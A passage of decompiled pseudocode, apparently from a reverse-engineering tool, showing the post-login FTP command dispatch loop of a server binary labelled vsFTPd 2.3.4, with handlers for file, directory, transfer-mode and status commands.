  _QWORD *v40; // [rsp+28h] [rbp-70h]
  _QWORD *v41; // [rsp+38h] [rbp-60h]
  unsigned __int64 v42; // [rsp+40h] [rbp-58h] BYREF
  __int64 v43; // [rsp+48h] [rbp-50h]
  char v44[4]; // [rsp+52h] [rbp-46h] BYREF
  __int16 v45; // [rsp+56h] [rbp-42h]
  unsigned __int64 v46; // [rsp+58h] [rbp-40h]

  v46 = __readfsqword(0x28u);
  sub_D520((__int64)(a1 + 49));
  if ( *((_DWORD *)a1 + 18) )
  {
    sub_151F0(dword_221BCC);
    *((_DWORD *)a1 + 12) = dword_221B2C;
  }
  else
  {
    sub_151F0(dword_221B88);
    *((_DWORD *)a1 + 12) = dword_221B10;
  }
  if ( *((_DWORD *)a1 + 38) )
  {
    if ( !dword_2219D8 )
      sub_4B30("HTTP needs download - fix your config");
    do
    {
      do
        sub_56E0((__int64)a1, (__int64 *)a1 + 43, (__int64)(a1 + 45), 1);
      while ( !sub_C4F0((__int64)(a1 + 43)) );
    }
    while ( !sub_C4F0((__int64)(a1 + 45)) );
    sub_55E0((__int64)a1, "HTTP/1.1 200 OK\r\n");
    sub_55E0((__int64)a1, "Server: vsftpd\r\n");
    sub_55E0((__int64)a1, "Connection: close\r\n");
    sub_55E0((__int64)a1, "X-Frame-Options: SAMEORIGIN\r\n");
    sub_55E0((__int64)a1, "X-Content-Type-Options: nosniff\r\n");
    sub_CD40((__int64)(a1 + 20), (__int64)(a1 + 45), 32);
    sub_C3A0((__int64)(a1 + 45), (__int64)(a1 + 20));
    sub_CD40((__int64)(a1 + 20), (__int64)(a1 + 43), 46);
    sub_C750((__int64)(a1 + 43));
    if ( sub_C600((__int64)(a1 + 43), "HTML") || sub_C600((__int64)(a1 + 43), "HTM") )
      sub_55E0((__int64)a1, "Content-Type: text/html\r\n");
    else
      sub_55E0((__int64)a1, "Content-Type: dunno\r\n");
    sub_55E0((__int64)a1, "\r\n");
    *((_DWORD *)a1 + 30) = 0;
    a1[14] = 0LL;
    sub_6160((__int64)a1, 1);
    if ( sub_C240((__int64)a1) )
      sub_C260((__int64)a1, 0);
    sub_12C90(0);
  }
  if ( dword_221B38 )
  {
    sub_124F0(5, (__int64)sub_58B0, (__int64)a1, 0);
    sub_12F00(0);
  }
  sub_DBC0((__int64)a1, 230);
  sub_5560((__int64)a1, 230, "Login successful.");
  v37 = (void **)(a1 + 4);
  v36 = (char **)(a1 + 40);
  v38 = a1 + 16;
  v41 = a1 + 35;
  v40 = a1 + 10;
LABEL_11:
  if ( dword_221C60 )
    goto LABEL_21;
  while ( 1 )
  {
    sub_56E0((__int64)a1, (__int64 *)a1 + 43, (__int64)(a1 + 45), 1);
    if ( dword_221C60 )
    {
      v42 = 0LL;
      v43 = 0LL;
      sub_C3A0((__int64)&v42, (__int64)(a1 + 43));
      if ( !sub_C4F0((__int64)(a1 + 45)) )
      {
        sub_C6A0((char **)&v42, 32);
        sub_C660((char **)&v42, (__int64)(a1 + 45));
      }
      sub_D210((__int64)&v42, 63);
      sub_16340(&v42);
      sub_C440((__int64)&v42);
    }
    if ( qword_221BB8 )
      break;
LABEL_7:
    v2 = (const char *)qword_221C10;
    if ( qword_221C10 )
    {
      v3 = 1;
LABEL_26:
      sub_C370((__int64)&unk_220B10, v2);
      while ( 1 )
      {
        sub_CD40((__int64)&unk_220B10, (__int64)&unk_220B00, 44);
        if ( sub_C4F0((__int64)&unk_220B10) )
          break;
        if ( sub_C5E0((__int64)&unk_220B10, (__int64)(a1 + 43)) )
          goto LABEL_19;
        sub_C3A0((__int64)&unk_220B10, (__int64)&unk_220B00);
      }
      if ( !v3 )
        goto LABEL_19;
    }
    if ( sub_C600((__int64)(a1 + 43), "QUIT") )
      sub_5640((__int64)a1, 221, "Goodbye.");
    if ( sub_C600((__int64)(a1 + 43), "PWD") || sub_C600((__int64)(a1 + 43), "XPWD") )
    {
      sub_D520((__int64)&unk_220AF0);
      sub_CC50((__int64)&unk_220AF0, "\"", "\"\"");
      sub_C370((__int64)&unk_220AE0, "\"");
      sub_C660((char **)&unk_220AE0, (__int64)&unk_220AF0);
      sub_C670((char **)&unk_220AE0, "\"");
      sub_56B0((__int64)a1, 257, (__int64)&unk_220AE0);
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "CWD") || sub_C600((__int64)(a1 + 43), "XCWD") )
      goto LABEL_38;
    if ( sub_C600((__int64)(a1 + 43), "CDUP") || sub_C600((__int64)(a1 + 43), "XCUP") )
    {
      sub_C370((__int64)(a1 + 45), "..");
LABEL_38:
      sub_5EB0((__int64)a1);
LABEL_10:
      if ( !sub_C240((__int64)a1) )
        goto LABEL_11;
      goto LABEL_20;
    }
    if ( dword_221BC4 )
    {
      if ( *((_DWORD *)a1 + 37) )
        goto LABEL_330;
      if ( sub_C600((__int64)(a1 + 43), "PASV") || sub_C600((__int64)(a1 + 43), "P@SW") )
      {
        sub_59F0((__int64)a1, 0);
        goto LABEL_10;
      }
      if ( dword_221BC4 )
      {
LABEL_330:
        if ( sub_C600((__int64)(a1 + 43), "EPSV") )
        {
          sub_59F0((__int64)a1, 1);
          goto LABEL_10;
        }
      }
    }
    if ( dword_2219D8 && sub_C600((__int64)(a1 + 43), "RETR") )
    {
      sub_6160((__int64)a1, 0);
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "NOOP") )
    {
      sub_5560((__int64)a1, 200, "NOOP ok.");
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "SYST") )
    {
      sub_5560((__int64)a1, 215, "UNIX Type: L8");
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "HELP") )
    {
      sub_55A0((__int64)a1, 214, "The following commands are recognized.");
      sub_55E0((__int64)a1, " ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD\r\n");
      sub_55E0((__int64)a1, " MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR\r\n");
      sub_55E0((__int64)a1, " RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD\r\n");
      sub_55E0((__int64)a1, " XPWD XRMD\r\n");
      sub_5560((__int64)a1, 214, "Help OK.");
      goto LABEL_10;
    }
    if ( dword_221AE4 && sub_C600((__int64)(a1 + 43), "LIST") )
    {
      sub_6540((__int64)a1, 1, 0);
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "TYPE") )
    {
      sub_C750((__int64)(a1 + 45));
      if ( sub_C600((__int64)(a1 + 45), "I")
        || sub_C600((__int64)(a1 + 45), "L8")
        || sub_C600((__int64)(a1 + 45), "L 8") )
      {
        *((_DWORD *)a1 + 30) = 0;
        sub_5560((__int64)a1, 200, "Switching to Binary mode.");
      }
      else if ( sub_C600((__int64)(a1 + 45), "A") || sub_C600((__int64)(a1 + 45), "A N") )
      {
        *((_DWORD *)a1 + 30) = 1;
        sub_5560((__int64)a1, 200, "Switching to ASCII mode.");
      }
      else
      {
        sub_5560((__int64)a1, 500, "Unrecognised TYPE command.");
      }
      goto LABEL_10;
    }
    if ( dword_221A78 && !*((_DWORD *)a1 + 37) && sub_C600((__int64)(a1 + 43), "PORT") )
    {
      sub_59D0((__int64)a1);
      sub_14550(v37);
      if ( !sub_10B30((__int64)(a1 + 45), 44, v44, 6) )
      {
        sub_5560((__int64)a1, 500, "Illegal PORT command.");
        goto LABEL_10;
      }
      v26 = v45;
      sub_147E0(v37, (__int64)*a1);
      v27 = __ROL2__(v26, 8);
      sub_14960(a1[4], v44);
      sub_14BC0(a1[4], v27);
      if ( dword_221BB0 || sub_14880(a1[1], a1[4]) && !sub_14BF0(v27) )
      {
        sub_5560((__int64)a1, 200, "PORT command successful. Consider using PASV.");
        goto LABEL_10;
      }
      v25 = "Illegal PORT command.";
LABEL_187:
      sub_5560((__int64)a1, 500, v25);
      sub_14550(v37);
      goto LABEL_10;
    }
    if ( !dword_221BF4 )
      goto LABEL_81;
    if ( dword_221A94 || !*((_DWORD *)a1 + 18) )
    {
      if ( sub_C600((__int64)(a1 + 43), "STOR") )
      {
        sub_6990((__int64)a1, 0, 0);
        goto LABEL_10;
      }
      if ( !dword_221BF4 )
        goto LABEL_81;
    }
    if ( dword_221A8C || !*((_DWORD *)a1 + 18) )
    {
      if ( sub_C600((__int64)(a1 + 43), "MKD") || sub_C600((__int64)(a1 + 43), "XMKD") )
      {
        sub_5D90((char **)a1 + 45, (__int64)a1);
        sub_C1A0(a1, 4u);
        sub_C3A0((__int64)v36, (__int64)(a1 + 45));
        sub_5CC0((__int64)v36);
        if ( sub_10C30((__int64)(a1 + 45)) )
        {
          if ( sub_D5E0(a1 + 45, 0x1FFu) )
          {
            sub_5560((__int64)a1, 550, "Create directory operation failed.");
          }
          else
          {
            sub_C260((__int64)a1, 1);
            sub_C3A0((__int64)&unk_220A10, (__int64)(a1 + 45));
            sub_5CC0((__int64)&unk_220A10);
            sub_CC50((__int64)&unk_220A10, "\"", "\"\"");
            sub_C370((__int64)&unk_220A00, "\"");
            sub_C660((char **)&unk_220A00, (__int64)&unk_220A10);
            sub_C670((char **)&unk_220A00, "\" created");
            sub_56B0((__int64)a1, 257, (__int64)&unk_220A00);
          }
          goto LABEL_10;
        }
        goto LABEL_19;
      }
      if ( !dword_221BF4 )
        goto LABEL_81;
    }
    if ( dword_221AD8 || !*((_DWORD *)a1 + 18) )
    {
      if ( sub_C600((__int64)(a1 + 43), "RMD") || sub_C600((__int64)(a1 + 43), "XRMD") )
      {
        sub_5D90((char **)a1 + 45, (__int64)a1);
        sub_C1A0(a1, 0xBu);
        sub_C3A0((__int64)v36, (__int64)(a1 + 45));
        sub_5CC0((__int64)v36);
        if ( sub_10C30((__int64)(a1 + 45)) )
        {
          if ( sub_D600(a1 + 45) )
          {
            sub_5560((__int64)a1, 550, "Remove directory operation failed.");
          }
          else
          {
            sub_C260((__int64)a1, 1);
            sub_5560((__int64)a1, 250, "Remove directory operation successful.");
          }
          goto LABEL_10;
        }
        goto LABEL_19;
      }
      if ( !dword_221BF4 )
        goto LABEL_81;
      if ( dword_221AD8 )
        goto LABEL_221;
    }
    if ( !*((_DWORD *)a1 + 18) )
    {
LABEL_221:
      if ( sub_C600((__int64)(a1 + 43), "DELE") )
      {
        sub_5D90((char **)a1 + 45, (__int64)a1);
        sub_C1A0(a1, 9u);
        sub_C3A0((__int64)v36, (__int64)(a1 + 45));
        sub_5CC0((__int64)v36);
        if ( sub_10C30((__int64)(a1 + 45)) )
        {
          if ( sub_D620(a1 + 45) )
          {
            sub_5560((__int64)a1, 550, "Delete operation failed.");
          }
          else
          {
            sub_C260((__int64)a1, 1);
            sub_5560((__int64)a1, 250, "Delete operation successful.");
          }
          goto LABEL_10;
        }
        goto LABEL_19;
      }
    }
LABEL_81:
    if ( sub_C600((__int64)(a1 + 43), "REST") )
    {
      v33 = 0LL;
      v34 = sub_D070(a1 + 45);
      if ( v34 >= 0 )
        v33 = v34;
      a1[14] = (_WORD *)v33;
      sub_C370((__int64)&unk_2209F0, "Restart position accepted (");
      sub_C6F0((char **)&unk_2209F0, v33);
      sub_C670((char **)&unk_2209F0, ").");
      sub_56B0((__int64)a1, 350, (__int64)&unk_2209F0);
      goto LABEL_10;
    }
    if ( dword_221BF4 )
    {
      if ( dword_221AD8 || !*((_DWORD *)a1 + 18) )
      {
        if ( sub_C600((__int64)(a1 + 43), "RNFR") )
        {
          sub_C440((__int64)v38);
          sub_5D90((char **)a1 + 45, (__int64)a1);
          if ( sub_10C30((__int64)(a1 + 45)) )
          {
            if ( sub_D6A0(a1 + 45, (struct stat64 **)&unk_2209E0) )
            {
              sub_C1A0(a1, 0xAu);
              sub_C3A0((__int64)v36, (__int64)(a1 + 45));
              sub_5CC0((__int64)v36);
              sub_5560((__int64)a1, 550, "RNFR command failed.");
            }
            else
            {
              sub_C3A0((__int64)v38, (__int64)(a1 + 45));
              sub_5560((__int64)a1, 350, "Ready for RNTO.");
            }
            goto LABEL_10;
          }
          sub_C1A0(a1, 0xAu);
          sub_C3A0((__int64)v36, (__int64)(a1 + 45));
          sub_5CC0((__int64)v36);
          goto LABEL_19;
        }
        if ( !dword_221BF4 )
          goto LABEL_90;
        if ( dword_221AD8 )
          goto LABEL_331;
      }
      if ( !*((_DWORD *)a1 + 18) )
      {
LABEL_331:
        if ( sub_C600((__int64)(a1 + 43), "RNTO") )
        {
          if ( sub_C4F0((__int64)v38) )
          {
            sub_5560((__int64)a1, 503, "RNFR required first.");
            goto LABEL_10;
          }
          sub_5D90((char **)a1 + 45, (__int64)a1);
          sub_C1A0(a1, 0xAu);
          sub_C3A0((__int64)v36, (__int64)v38);
          sub_5CC0((__int64)v36);
          sub_C6A0(v36, 32);
          sub_C3A0((__int64)&unk_2209D0, (__int64)(a1 + 45));
          sub_5CC0((__int64)&unk_2209D0);
          sub_C660(v36, (__int64)&unk_2209D0);
          if ( sub_10C30((__int64)(a1 + 45)) )
          {
            v35 = sub_D740(v38, a1 + 45);
            sub_C440((__int64)v38);
            if ( v35 )
            {
              sub_5560((__int64)a1, 550, "Rename failed.");
            }
            else
            {
              sub_C260((__int64)a1, 1);
              sub_5560((__int64)a1, 250, "Rename successful.");
            }
            goto LABEL_10;
          }
          goto LABEL_19;
        }
      }
    }
LABEL_90:
    if ( dword_221AE4 && sub_C600((__int64)(a1 + 43), "NLST") )
    {
      sub_6540((__int64)a1, 0, 0);
      goto LABEL_10;
    }
    if ( sub_C600((__int64)(a1 + 43), "SIZE") )
    {
      sub_5D90((char **)a1 + 45, (__int64)a1);
      if ( sub_10C30((__int64)(a1 + 45)) )
      {
        if ( !sub_D6A0(a1 + 45, (struct stat64 **)&qword_2209C0) && sub_13A20(qword_2209C0) )
        {
          v4 = sub_13D50(qword_2209C0);
          sub_C410((__int64)&unk_2209B0, v4);
          sub_56B0((__int64)a1, 213, (__int64)&unk_2209B0);
        }
        else
        {
          sub_5560((__int64)a1, 550, "Could not get file size.");
        }
        goto LABEL_10;
      }
    }
    else if ( !*((_DWORD *)a1 + 18) && sub_C600((__int64)(a1 + 43), "SITE") )
    {
      sub_CD40((__int64)(a1 + 45), (__int64)qword_2209A0, 32);
      sub_C750((__int64)(a1 + 45));
      if ( !dword_221BF4 || !dword_221AE8 || !sub_C600((__int64)(a1 + 45), "CHMOD") )
      {
        if ( sub_C600((__int64)(a1 + 45), "UMASK") )
        {
          v21 = "Your current UMASK is ";
          if ( !sub_C4F0((__int64)qword_2209A0) )
          {
            v22 = sub_D090(qword_2209A0);
            sub_151F0(v22);
            v21 = "UMASK set to ";
          }
          sub_C370((__int64)&unk_220980, v21);
          v23 = sub_151E0();
          v24 = sub_13390(v23);
          sub_C670((char **)&unk_220980, (const char *)v24);
          sub_56B0((__int64)a1, 200, (__int64)&unk_220980);
        }
        else if ( sub_C600((__int64)(a1 + 45), "HELP") )
        {
          sub_5560((__int64)a1, 214, "CHMOD UMASK HELP");
        }
        else
        {
          sub_5560((__int64)a1, 500, "Unknown SITE command.");
        }
        goto LABEL_10;
      }
      if ( sub_C4F0((__int64)qword_2209A0)
        || (sub_CD40((__int64)qword_2209A0, (__int64)&unk_220990, 32), sub_C4F0((__int64)&unk_220990)) )
      {
        sub_5560((__int64)a1, 500, "SITE CHMOD needs 2 arguments.");
        goto LABEL_10;
      }
      sub_5D90((char **)&unk_220990, (__int64)a1);
      sub_C1A0(a1, 0xCu);
      sub_C3A0((__int64)v36, (__int64)&unk_220990);
      sub_5CC0((__int64)v36);
      sub_C6A0(v36, 32);
      sub_C660(v36, (__int64)qword_2209A0);
      if ( sub_10C30((__int64)&unk_220990) )
      {
        v19 = sub_D090(qword_2209A0);
        v20 = sub_D720(&unk_220990, v19);
        if ( (unsigned int)sub_13F40(v20) )
        {
          sub_5560((__int64)a1, 550, "SITE CHMOD command failed.");
        }
        else
        {
          sub_C260((__int64)a1, 1);
          sub_5560((__int64)a1, 200, "SITE CHMOD command ok.");
        }
        goto LABEL_10;
      }
    }
    else
    {
      if ( sub_C600((__int64)(a1 + 43), "ABOR") || sub_C600((__int64)(a1 + 43), byte_176BF) )
      {
        sub_5560((__int64)a1, 225, "No transfer to ABOR.");
        goto LABEL_10;
      }
      if ( dword_221BF4 && (dword_221AD8 || !*((_DWORD *)a1 + 18)) && sub_C600((__int64)(a1 + 43), "APPE") )
      {
        sub_6990((__int64)a1, 1, 0);
        goto LABEL_10;
      }
      if ( sub_C600((__int64)(a1 + 43), "MDTM") )
      {
        v42 = sub_CA70((__int64)(a1 + 45), 32);
        LODWORD(v43) = v5;
        v6 = HIDWORD(v42);
        v7 = sub_D6A0(a1 + 45, (struct stat64 **)&qword_220970);
        v8 = v7;
        if ( dword_2219FC )
        {
          if ( v7 )
          {
            if ( (_DWORD)v42
              && (v12 = sub_CEE0((__int64)(a1 + 45), 0), (unsigned int)sub_13510(v12))
              && ((_DWORD)v6 == 8
               || (_DWORD)v6 == 14
               || (unsigned int)v6 > 0xF && (unsigned __int8)sub_CEE0((__int64)(a1 + 45), 0xEu) == 46) )
            {
              sub_CD40((__int64)(a1 + 45), (__int64)&unk_220960, 32);
              v13 = (const char *)sub_C510(a1 + 45);
              v14 = sub_156E0(v13);
              sub_C3A0((__int64)(a1 + 45), (__int64)&unk_220960);
              sub_5D90((char **)a1 + 45, (__int64)a1);
              if ( sub_10C30((__int64)(a1 + 45)) )
              {
                if ( dword_221BF4 && (dword_221AD8 || !*((_DWORD *)a1 + 18)) )
                {
                  if ( sub_D6A0(a1 + 45, (struct stat64 **)&qword_220970)
                    || !sub_13A20(qword_220970)
                    || (v15 = dword_221A34, v16 = (char *)sub_C510(a1 + 45), sub_15880(v16, v14, v15)) )
                  {
                    sub_5560((__int64)a1, 550, "Could not set file modification time.");
                  }
                  else
                  {
                    sub_5560((__int64)a1, 213, "File modification time set.");
                  }
                  goto LABEL_10;
                }
LABEL_122:
                sub_5560((__int64)a1, 550, "Could not get file modification time.");
                goto LABEL_10;
              }
            }
            else
            {
              sub_5D90((char **)a1 + 45, (__int64)a1);
              if ( sub_10C30((__int64)(a1 + 45)) )
                goto LABEL_122;
            }
          }
          else
          {
            sub_5D90((char **)a1 + 45, (__int64)a1);
            if ( sub_10C30((__int64)(a1 + 45)) )
              goto LABEL_157;
          }
        }
        else
        {
          sub_5D90((char **)a1 + 45, (__int64)a1);
          if ( sub_10C30((__int64)(a1 + 45)) )
          {
            if ( !v8 )
            {
LABEL_157:
              if ( sub_13A20(qword_220970) )
              {
                v18 = sub_13CF0(qword_220970, dword_221A34);
                sub_C370((__int64)&unk_220950, v18);
                sub_56B0((__int64)a1, 213, (__int64)&unk_220950);
                goto LABEL_10;
              }
            }
            goto LABEL_122;
          }
        }
      }
      else
      {
        if ( dword_221A78 && sub_C600((__int64)(a1 + 43), "EPRT") )
        {
          v9 = sub_14950(*a1);
          sub_14550(v37);
          sub_59D0((__int64)a1);
          sub_C3A0((__int64)&unk_220940, (__int64)(a1 + 45));
          sub_CD40((__int64)&unk_220940, (__int64)qword_220930, 124);
          if ( !sub_C4F0((__int64)&unk_220940) )
            goto LABEL_132;
          sub_CD40((__int64)qword_220930, (__int64)&unk_220940, 124);
          v10 = sub_D050(qword_220930);
          if ( (unsigned int)(v10 - 1) > 1 || !v9 && v10 == 2 )
          {
            sub_5560((__int64)a1, 500, "Bad EPRT protocol.");
            goto LABEL_10;
          }
          sub_CD40((__int64)&unk_220940, (__int64)qword_220930, 124);
          if ( v10 == 2 )
          {
            sub_CD40((__int64)&unk_220940, (__int64)&unk_220920, 37);
            v11 = (const void *)sub_10A30((__int64)&unk_220940);
          }
          else
          {
            v11 = sub_10C10((__int64)&unk_220940);
          }
          if ( !v11
            || (sub_CD40((__int64)qword_220930, (__int64)&unk_220940, 124), !sub_C4F0((__int64)&unk_220940))
            || sub_C4F0((__int64)qword_220930)
            || (v39 = sub_D050(qword_220930), v39 > 0xFFFF) )
          {
LABEL_132:
            sub_5560((__int64)a1, 500, "Bad EPRT command.");
            goto LABEL_10;
          }
          sub_147E0(v37, (__int64)*a1);
          v17 = a1[4];
          if ( v10 == 2 )
            sub_14A10(v17, v11);
          else
            sub_14960(v17, v11);
          sub_14BC0(a1[4], v39);
          if ( dword_221BB0 || sub_14880(a1[1], a1[4]) && !sub_14BF0(v39) )
          {
            sub_5560((__int64)a1, 200, "EPRT command successful. Consider using EPSV.");
            goto LABEL_10;
          }
          v25 = "Illegal EPRT command.";
          goto LABEL_187;
        }
        if ( sub_C600((__int64)(a1 + 43), "STRU") )
        {
          sub_C750((__int64)(a1 + 45));
          if ( sub_C600((__int64)(a1 + 45), "F") )
            sub_5560((__int64)a1, 200, "Structure set to F.");
          else
            sub_5560((__int64)a1, 504, "Bad STRU command.");
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "MODE") )
        {
          sub_C750((__int64)(a1 + 45));
          if ( sub_C600((__int64)(a1 + 45), "S") )
            sub_5560((__int64)a1, 200, "Mode set to S.");
          else
            sub_5560((__int64)a1, 504, "Bad MODE command.");
          goto LABEL_10;
        }
        if ( dword_221BF4 && (dword_221A94 || !*((_DWORD *)a1 + 18)) && sub_C600((__int64)(a1 + 43), "STOU") )
        {
          sub_6990((__int64)a1, 0, 1);
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "ALLO") )
        {
          sub_5560((__int64)a1, 202, "ALLO command ignored.");
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "REIN") )
        {
          sub_5560((__int64)a1, 502, "REIN not implemented.");
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "ACCT") )
        {
          sub_5560((__int64)a1, 502, "ACCT not implemented.");
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "SMNT") )
        {
          sub_5560((__int64)a1, 502, "SMNT not implemented.");
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "FEAT") )
        {
          sub_10DB0((__int64)a1);
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "OPTS") )
        {
          sub_11250((__int64)a1);
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "STAT") && sub_C4F0((__int64)(a1 + 45)) )
        {
          sub_55A0((__int64)a1, 211, "FTP server status:");
          sub_55E0((__int64)a1, "     Connected to ");
          v28 = (const char *)sub_C510(v41);
          sub_55E0((__int64)a1, v28);
          sub_55E0((__int64)a1, "\r\n");
          sub_55E0((__int64)a1, "     Logged in as ");
          v29 = (const char *)sub_C510(v40);
          sub_55E0((__int64)a1, v29);
          sub_55E0((__int64)a1, "\r\n");
          sub_55E0((__int64)a1, "     TYPE: ");
          if ( *((_DWORD *)a1 + 30) )
            sub_55E0((__int64)a1, "ASCII\r\n");
          else
            sub_55E0((__int64)a1, "BINARY\r\n");
          if ( *((_DWORD *)a1 + 12) )
          {
            sub_55E0((__int64)a1, "     Session bandwidth limit in byte/s is ");
            v32 = (const char *)sub_132D0(*((unsigned int *)a1 + 12));
            sub_55E0((__int64)a1, v32);
            sub_55E0((__int64)a1, "\r\n");
          }
          else
          {
            sub_55E0((__int64)a1, "     No session bandwidth limit\r\n");
          }
          if ( seconds )
          {
            sub_55E0((__int64)a1, "     Session timeout in seconds is ");
            v31 = (const char *)sub_132D0(seconds);
            sub_55E0((__int64)a1, v31);
            sub_55E0((__int64)a1, "\r\n");
          }
          else
          {
            sub_55E0((__int64)a1, "     No session timeout\r\n");
          }
          if ( *((_DWORD *)a1 + 102) )
            sub_55E0((__int64)a1, "     Control connection is encrypted\r\n");
          else
            sub_55E0((__int64)a1, "     Control connection is plain text\r\n");
          if ( *((_DWORD *)a1 + 103) )
            sub_55E0((__int64)a1, "     Data connections will be encrypted\r\n");
          else
            sub_55E0((__int64)a1, "     Data connections will be plain text\r\n");
          if ( *((_DWORD *)a1 + 96) )
          {
            sub_55E0((__int64)a1, "     At session startup, client count was ");
            v30 = (const char *)sub_132D0(*((unsigned int *)a1 + 96));
            sub_55E0((__int64)a1, v30);
            sub_55E0((__int64)a1, "\r\n");
          }
          sub_55E0((__int64)a1, "     vsFTPd 2.3.4 - secure, fast, stable\r\n");
          sub_5560((__int64)a1, 211, "End of status");
          goto LABEL_10;
        }
        if ( dword_221AE4 && sub_C600((__int64)(a1 + 43), "STAT") )
        {
          sub_6540((__int64)a1, 1, 1);
          goto LABEL_10;
        }
        if ( dword_221AB0 )
        {
          if ( sub_C600((__int64)(a1 + 43), "PBSZ") )
          {
            nullsub_3(a1);
            goto LABEL_10;
          }
          if ( dword_221AB0 && sub_C600((__int64)(a1 + 43), "PROT") )
          {
            nullsub_4(a1);
            goto LABEL_10;
          }
        }
        if ( sub_C600((__int64)(a1 + 43), "USER") )
        {
          if ( *((_DWORD *)a1 + 18) )
          {
            sub_5560((__int64)a1, 530, "Can't change from guest user.");
          }
          else if ( sub_C5E0((__int64)v40, (__int64)(a1 + 45)) )
          {
            sub_5560((__int64)a1, 331, "Any password will do.");
          }
          else
          {
            sub_5560((__int64)a1, 530, "Can't change to another user.");
          }
          goto LABEL_10;
        }
        if ( sub_C600((__int64)(a1 + 43), "PASS") )
        {
          sub_5560((__int64)a1, 230, "Already logged in.");
          goto LABEL_10;
        }
        if ( !sub_C600((__int64)(a1 + 43), "PASV")
          && !sub_C600((__int64)(a1 + 43), "PORT")
          && !sub_C600((__int64)(a1 + 43), "STOR")
          && !sub_C600((__int64)(a1 + 43), "MKD")
          && !sub_C600((__int64)(a1 + 43), "XMKD")
          && !sub_C600((__int64)(a1 + 43), "RMD")
          && !sub_C600((__int64)(a1 + 43), "XRMD")
          && !sub_C600((__int64)(a1 + 43), "DELE")
          && !sub_C600((__int64)(a1 + 43), "RNFR")
          && !sub_C600((__int64)(a1 + 43), "RNTO")
          && !sub_C600((__int64)(a1 + 43), "SITE")
          && !sub_C600((__int64)(a1 + 43), "APPE")
          && !sub_C600((__int64)(a1 + 43), "EPSV")
          && !sub_C600((__int64)(a1 + 43), "EPRT")
          && !sub_C600((__int64)(a1 + 43), "RETR")
          && !sub_C600((__int64)(a1 + 43), "LIST")
          && !sub_C600((__int64)(a1 + 43), "NLST")
          && !sub_C600((__int64)(a1 + 43), "STOU")
          && !sub_C600((__int64)(a1 + 43), "ALLO")
          && !sub_C600((__int64)(a1 + 43), "REIN")
          && !sub_C600((__int64)(a1 + 43), "ACCT")
          && !sub_C600((__int64)(a1 + 43), "SMNT")
          && !sub_C600((__int64)(a1 + 43), "FEAT")
          && !sub_C600((__int64)(a1 + 43), "OPTS")
          && !sub_C600((__int64)(a1 + 43), "STAT")
          && !sub_C600((__int64)(a1 + 43), "PBSZ")
          && !sub_C600((__int64)(a1 + 43), "PROT") )
        {
          if ( !sub_C4F0((__int64)(a1 + 43)) || !sub_C4F0((__int64)(a1 + 45)) )
            sub_5560((__int64)a1, 500, "Unknown command.");
          goto LABEL_10;
        }
      }
    }
LABEL_19:
    sub_5560((__int64)a1, 550, "Permission denied.");
    if ( !sub_C240((__int64)a1) )
      goto LABEL_11;
LABEL_20:
    sub_C260((__int64)a1, 0);
    if ( dword_221C60 )
LABEL_21:
      sub_161F0("IDLE");
  }
  sub_C370((__int64)&unk_220B30, (const char *)qword_221BB8);
  while ( 1 )
  {
    sub_CD40((__int64)&unk_220B30, (__int64)&unk_220B20, 44);
    if ( sub_C4F0((__int64)&unk_220B30) )
      break;
    if ( sub_C5E0((__int64)&unk_220B30, (__int64)(a1 + 43)) )
      goto LABEL_7;
    sub_C3A0((__int64)&unk_220B30, (__int64)&unk_220B20);
  }
  v2 = (const char *)qword_221C10;
  if ( !qword_221C10 )
    goto LABEL_19;
  v3 = 0;
  goto LABEL_26;
}
// 79C7: variable 'v5' is possibly undefined
// 112E0: using guessed type __int64 __fastcall nullsub_3(_QWORD);
// 112F0: using guessed type __int64 __fastcall nullsub_4(_QWORD);
// 151E0: using guessed type __int64 sub_151E0(void);
// 220930: using guessed type _QWORD qword_220930[2];
// 220970: using guessed type __int64 qword_220970;
// 2209A0: using guessed type _QWORD qword_2209A0[2];
// 2209C0: using guessed type __int64 qword_2209C0;
// 2219D8: using guessed type int dword_2219D8;
// 2219FC: using guessed type int dword_2219FC;
// 221A34: using guessed type int dword_221A34;
// 221A78: using guessed type int dword_221A78;
// 221A8C: using guessed type int dword_221A8C;
// 221A94: using guessed type int dword_221A94;
// 221AB0: using guessed type int dword_221AB0;
// 221AD8: using guessed type int dword_221AD8;
// 221AE4: using guessed type int dword_221AE4;
// 221AE8: using guessed type int dword_221AE8;
// 221B10: using guessed type int dword_221B10;
// 221B2C: using guessed type int dword_221B2C;
// 221B38: using guessed type int dword_221B38;
// 221B88: using guessed type int dword_221B88;
// 221BB0: using guessed type int dword_221BB0;
// 221BC4: using guessed type int dword_221BC4;
// 221BCC: using guessed type int dword_221BCC;
// 221BF4: using guessed type int dword_221BF4;
// 221C60: using guessed type int dword_221C60;

//----- (0000000000008F60) ----------------------------------------------------
__int64 __fastcall sub_8F60(__int64 a1)
{
  __int64 v1; // rax
  __int64 result; // rax

  if ( *(_DWORD *)(a1 + 376) != -1 )
    sub_4B30("parent_fd active");
  if ( *(_DWORD *)(a1 + 380) != -1 )
    sub_4B30("child_fd active");
  v1 = sub_14060();
  *(_DWORD *)(a1 + 376) = v1;
  result = v1 >> 32;
  *(_DWORD *)(a1 + 380) = result;
  return result;
}
// 14060: using guessed type __int64 sub_14060(void);

//----- (0000000000008FB0) ----------------------------------------------------
int __fastcall sub_8FB0(__int64 a1)
{
  int v2; // edi
  int result; // eax
  int v4; // edi

  v2 = *(_DWORD *)(a1 + 376);
  if ( v2 != -1 )
  {
    result = sub_13880(v2);
